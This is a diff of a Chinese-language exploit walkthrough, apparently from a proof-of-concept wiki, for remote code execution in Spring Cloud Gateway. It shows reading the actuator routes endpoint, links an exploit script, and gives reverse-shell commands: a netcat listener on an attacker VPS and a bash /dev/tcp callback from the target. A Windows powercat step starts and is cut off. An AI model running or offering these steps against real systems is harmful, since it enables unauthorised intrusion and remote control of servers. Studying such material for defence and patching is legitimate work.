@@ -10,30 +10,30 @@
 
 #### 步骤一：
 
+访问页面，可以看到路由配置信息：
 ` http://ip:端口/actuator/gateway/routes `
-
-访问页面，可以看到路由配置信息。
 
 #### 步骤二：
 
-使用[脚本](url地址)执行RCE命令
+使用[脚本](https://github.com/user-error-404/WIKI-POC/blob/main/Wiki/开发框架漏洞/SpringBoot/SpringCloud%20Gateway/file/SpringCloudGateway.py)执行RCE命令
 
-![](img_url)
+![](https://github.com/user-error-404/WIKI-POC/blob/main/Wiki/开发框架漏洞/SpringBoot/SpringCloud%20Gateway/img/whoami.png)
 
 #### 步骤三：
 	
 反弹shell
 
-vps开启nc监听：
+>vps开启nc监听：
 ```base
 nc -lvp 2333
 ```
 目标机器cmd执行：
-linux：
+
+>linux：
 ```base
 bash -i >& /dev/tcp/vpsIP/2333 0>&1
 ```
-windows：
+>windows：
 
 powercat反弹：
 ```base
